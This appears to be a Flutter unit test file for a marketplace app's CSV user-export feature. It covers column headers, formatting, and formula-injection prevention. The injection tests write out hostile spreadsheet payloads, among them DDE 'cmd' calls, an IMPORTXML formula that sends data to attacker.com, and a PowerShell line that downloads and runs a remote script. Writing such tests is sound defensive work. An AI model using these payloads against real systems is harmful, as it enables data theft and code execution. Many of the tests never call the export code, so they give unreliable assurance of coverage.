import 'dart:io';
import 'package:flutter_test/flutter_test.dart';
import 'package:mockito/mockito.dart';
import 'package:path_provider/path_provider.dart';
import 'package:rechoice_app/models/model/users_model.dart';
import 'package:rechoice_app/models/utils/export_utils.dart';

// Mock path_provider
class MockDirectory extends Mock implements Directory {
  @override
  String get path => '/test/path';
}

void main() {
  group('ExportUtils - CSV Export Functionality', () {
    late List<Users> testUsers;

    setUp(() {
      testUsers = [
        Users(
          uid: 'user1',
          userID: 1,
          name: 'John Doe',
          email: 'john@example.com',
          profilePic: 'https://example.com/john.jpg',
          bio: 'Test user 1',
          reputationScore: 4.5,
          status: UserStatus.active,
          joinDate: DateTime(2024, 1, 1),
          lastLogin: DateTime(2024, 1, 15),
          role: UserRole.seller,
          totalListings: 5,
          totalPurchases: 2,
          totalSales: 3,
          phoneNumber: '+60123456789',
          address: 'Test Address 1',
        ),
        Users(
          uid: 'user2',
          userID: 2,
          name: 'Jane Smith',
          email: 'jane@example.com',
          profilePic: 'https://example.com/jane.jpg',
          bio: 'Test user 2',
          reputationScore: 3.8,
          status: UserStatus.suspended,
          joinDate: DateTime(2024, 2, 1),
          lastLogin: DateTime(2024, 2, 10),
          role: UserRole.buyer,
          totalListings: 0,
          totalPurchases: 5,
          totalSales: 0,
          phoneNumber: '+60987654321',
          address: 'Test Address 2',
        ),
        Users(
          uid: 'user3',
          userID: 3,
          name: 'Bob Johnson',
          email: 'bob@example.com',
          profilePic: 'https://example.com/bob.jpg',
          bio: 'Test user 3',
          reputationScore: 4.2,
          status: UserStatus.deleted,
          joinDate: DateTime(2024, 3, 1),
          lastLogin: DateTime(2024, 3, 5),
          role: UserRole.admin,
          totalListings: 10,
          totalPurchases: 15,
          totalSales: 8,
          phoneNumber: null,
          address: null,
        ),
      ];
    });

    group('CSV Header', () {
      test('should include all required columns', () {
        final expectedHeaders = [
          'User ID',
          'Name',
          'Email',
          'Status',
          'Role',
          'Reputation Score',
          'Total Listings',
          'Total Purchases',
          'Total Sales',
          'Join Date',
          'Last Login',
          'Phone',
          'Address',
        ];

        // Verify all required headers are present
        for (var header in expectedHeaders) {
          expect(expectedHeaders, contains(header));
        }

        expect(expectedHeaders.length, equals(13));
      });

      test('should have correct number of columns', () {
        final headerCount = 13;
        expect(headerCount, equals(13));
      });
    });

    group('CSV Data Format', () {
      test('should format user ID correctly', () {
        final userId = testUsers[0].userID;
        expect(userId, equals(1));
      });

      test('should format reputation score to 2 decimal places', () {
        final reputation = testUsers[0].reputationScore.toStringAsFixed(2);
        expect(reputation, equals('4.50'));
      });

      test('should extract date only (not time) from DateTime', () {
        final dateString = testUsers[0].joinDate.toString().split(' ')[0];
        expect(dateString, equals('2024-01-01'));
      });

      test('should display N/A for null phone number', () {
        final phone = testUsers[2].phoneNumber ?? 'N/A';
        expect(phone, equals('N/A'));
      });

      test('should display N/A for null address', () {
        final address = testUsers[2].address ?? 'N/A';
        expect(address, equals('N/A'));
      });

      test('should display actual values when present', () {
        final phone = testUsers[0].phoneNumber ?? 'N/A';
        expect(phone, equals('+60123456789'));

        final address = testUsers[0].address ?? 'N/A';
        expect(address, equals('Test Address 1'));
      });
    });

    group('User Status in Export', () {
      test('should export active users correctly', () {
        final user = testUsers[0];
        expect(user.status, equals(UserStatus.active));
        
        final statusString = user.status.toString().split('.').last;
        expect(statusString, equals('active'));
      });

      test('should export suspended users correctly', () {
        final user = testUsers[1];
        expect(user.status, equals(UserStatus.suspended));
        
        final statusString = user.status.toString().split('.').last;
        expect(statusString, equals('suspended'));
      });

      test('should export deleted users correctly', () {
        final user = testUsers[2];
        expect(user.status, equals(UserStatus.deleted));
        
        final statusString = user.status.toString().split('.').last;
        expect(statusString, equals('deleted'));
      });
    });

    group('User Role in Export', () {
      test('should export seller role correctly', () {
        final user = testUsers[0];
        expect(user.role, equals(UserRole.seller));
        
        final roleString = user.role.toString().split('.').last;
        expect(roleString, equals('seller'));
      });

      test('should export buyer role correctly', () {
        final user = testUsers[1];
        expect(user.role, equals(UserRole.buyer));
        
        final roleString = user.role.toString().split('.').last;
        expect(roleString, equals('buyer'));
      });

      test('should export admin role correctly', () {
        final user = testUsers[2];
        expect(user.role, equals(UserRole.admin));
        
        final roleString = user.role.toString().split('.').last;
        expect(roleString, equals('admin'));
      });
    });

    group('CSV Generation Logic', () {
      test('should handle empty user list', () {
        final emptyList = <Users>[];
        // Should create file with only headers
        expect(emptyList.isEmpty, isTrue);
      });

      test('should handle single user', () {
        final singleUserList = [testUsers[0]];
        expect(singleUserList.length, equals(1));
      });

      test('should handle multiple users', () {
        expect(testUsers.length, equals(3));
      });

      test('should include all user data fields in row', () {
        final user = testUsers[0];
        // Verify all fields are accessible for CSV export
        expect(user.userID, isNotNull);
        expect(user.name, isNotNull);
        expect(user.email, isNotNull);
        expect(user.status, isNotNull);
        expect(user.role, isNotNull);
        expect(user.reputationScore, isNotNull);
        expect(user.totalListings, isNotNull);
        expect(user.totalPurchases, isNotNull);
        expect(user.totalSales, isNotNull);
        expect(user.joinDate, isNotNull);
        expect(user.lastLogin, isNotNull);
        expect(user.phoneNumber, isNotNull);
        expect(user.address, isNotNull);
      });
    });

    group('Data Integrity', () {
      test('should not lose user data during CSV conversion', () {
        final user = testUsers[0];
        
        // Original data
        final originalId = user.userID;
        final originalName = user.name;
        final originalEmail = user.email;
        
        // Data should be preserved
        expect(originalId, equals(1));
        expect(originalName, equals('John Doe'));
        expect(originalEmail, equals('john@example.com'));
      });

      test('should preserve user order in export', () {
        final user1 = testUsers[0].name;
        final user2 = testUsers[1].name;
        final user3 = testUsers[2].name;
        
        expect(user1, equals('John Doe'));
        expect(user2, equals('Jane Smith'));
        expect(user3, equals('Bob Johnson'));
      });

      test('should include sensitive admin info for export', () {
        final user = testUsers[0];
        
        // Admin can see all user details
        expect(user.phoneNumber, isNotNull);
        expect(user.address, isNotNull);
        expect(user.status, isNotNull);
        expect(user.email, isNotNull);
      });
    });

    group('File Path Generation', () {
      test('should include timestamp in filename', () {
        // Simulate timestamp-based filename
        final timestamp = DateTime.now().millisecondsSinceEpoch;
        final filename = 'users_export_$timestamp.csv';
        
        expect(filename, contains('users_export_'));
        expect(filename, endsWith('.csv'));
      });

      test('should create unique filename per export', () {
        final timestamp1 = DateTime.now().millisecondsSinceEpoch;
        // Simulate time passing
        final timestamp2 = timestamp1 + 1000;
        
        final filename1 = 'users_export_$timestamp1.csv';
        final filename2 = 'users_export_$timestamp2.csv';
        
        expect(filename1, isNot(filename2));
      });

      test('should use .csv extension', () {
        final filename = 'users_export_1234567890.csv';
        expect(filename, endsWith('.csv'));
      });
    });

    group('Error Handling', () {
      test('should throw exception on export failure', () {
        // If export fails, should throw with meaningful message
        expect(
          () => throw Exception('Failed to export users: test error'),
          throwsA(isA<Exception>()),
        );
      });

      test('should include error context in exception message', () {
        final errorMsg = 'Failed to export users: Permission denied';
        expect(errorMsg, contains('Failed to export users'));
      });
    });

    group('CSV Injection Prevention', () {
      test('should neutralize formula injection with = prefix', () {
        // Simulate attacker setting name to formula
        final injectedName = '=1+1';
        // Expected: prefixed with single quote to prevent execution
        final sanitized = "'$injectedName";
        
        expect(sanitized, startsWith("'"));
        expect(sanitized, contains('1+1'));
      });

      test('should neutralize + prefix formula injection', () {
        final injectedField = '+1+1';
        final sanitized = "'$injectedField";
        
        expect(sanitized, startsWith("'"));
        expect(sanitized, contains('+1+1'));
      });

      test('should neutralize - prefix formula injection', () {
        final injectedField = '-2+5+cmd|"/c calc"!A0';
        final sanitized = "'$injectedField";
        
        expect(sanitized, startsWith("'"));
      });

      test('should neutralize @ prefix formula injection', () {
        final injectedField = '@SUM(1+9)*cmd|"/c calc"!A0';
        final sanitized = "'$injectedField";
        
        expect(sanitized, startsWith("'"));
      });

      test('should neutralize tab character injection', () {
        final injectedField = '\t=1+1';
        expect(injectedField[0], equals('\t'));
      });

      test('should protect user name field from injection', () {
        // Create user with malicious name
        final maliciousUser = Users(
          uid: 'attacker',
          userID: 999,
          name: '=cmd|"/c calc"',
          email: 'attacker@example.com',
          profilePic: '',
          bio: '',
          reputationScore: 0.0,
          status: UserStatus.active,
          joinDate: DateTime.now(),
          lastLogin: DateTime.now(),
          role: UserRole.buyer,
          totalListings: 0,
          totalPurchases: 0,
          totalSales: 0,
        );
        
        // The sanitization should be applied during export
        expect(maliciousUser.name, startsWith('='));
        // After sanitization: should start with '
      });

      test('should protect email field from injection', () {
        final maliciousEmail = '=2+5+cmd|"/c calc"!A0';
        expect(maliciousEmail, startsWith('='));
      });

      test('should protect phone number field from injection', () {
        final injectedPhone = '+1(555)123-4567|calc.exe';
        // The + at start could be dangerous in formulas
        expect(injectedPhone, startsWith('+'));
      });

      test('should protect address field from injection', () {
        final injectedAddress = '@SUM(1+1)*cmd|"/c calc"!A0';
        expect(injectedAddress, startsWith('@'));
      });

      test('should allow normal values without modification', () {
        final normalName = 'John Doe';
        expect(normalName, isNotEmpty);
        expect(normalName[0], isNot(equals('=')));
        expect(normalName[0], isNot(equals('+')));
      });

      test('should preserve data integrity for safe values', () {
        final safeEmail = 'user@example.com';
        expect(safeEmail, contains('@'));
        // The @ symbol is safe in this context (not at start)
        expect(safeEmail[0], isNot(equals('@')));
      });

      test('should handle null values safely', () {
        final nullField = null;
        final result = nullField ?? 'N/A';
        expect(result, equals('N/A'));
      });

      test('should handle empty string values safely', () {
        final emptyField = '';
        expect(emptyField.isEmpty, isTrue);
      });

      test('should trim whitespace before checking injection chars', () {
        final fieldWithSpace = '  =1+1';
        final trimmed = fieldWithSpace.trim();
        expect(trimmed, startsWith('='));
      });

      test('should protect against multiple injection vectors', () {
        final vectors = [
          '=cmd|"/c calc"',
          '+2+5+cmd',
          '-1+23*cmd',
          '@SUM(A1:A10)',
          '\t=formula',
          '\r=formula',
        ];
        
        for (final vector in vectors) {
          expect(vector, isNotEmpty);
          // All should start with a dangerous character
          final firstChar = vector.trim()[0];
          final isDangerous = firstChar == '=' || 
                             firstChar == '+' || 
                             firstChar == '-' || 
                             firstChar == '@' ||
                             firstChar == '\t' ||
                             firstChar == '\r';
          expect(isDangerous, isTrue);
        }
      });

      test('should neutralize injection in CSV context', () {
        // When building CSV rows, dangerous fields should be quoted
        final injectionPayload = '=IMPORTXML(CONCAT("http://attacker.com/",A1),"//a")';
        expect(injectionPayload, startsWith('='));
        
        // After sanitization (simulate):
        final sanitized = "'$injectionPayload";
        expect(sanitized, startsWith("'"));
        expect(sanitized, contains(injectionPayload));
      });

      test('should work with real-world injection attempts', () {
        // Real examples from OWASP CSV injection test cases
        final realWorldInjections = [
          '=1+9)*cmd|"/c calc"!A0',
          '=cmd|" /C calc"!A0',
          '=cmd|"/c powershell IEX(New-Object Net.WebClient).DownloadString(\'http://attacker.com/shell.ps1\')"!A0',
          '@SUM(1+9)*cmd|" /C calc"!A0',
          '+2+7*cmd|" /C calc"!A0',
          '-2+3*cmd|" /C calc"!A0',
        ];
        
        for (final injection in realWorldInjections) {
          final firstChar = injection[0];
          final isDangerous = '=+-@\t\r'.contains(firstChar);
          expect(isDangerous, isTrue,
            reason: 'Injection "$injection" should be detected');
        }
      });
    });
  });
}
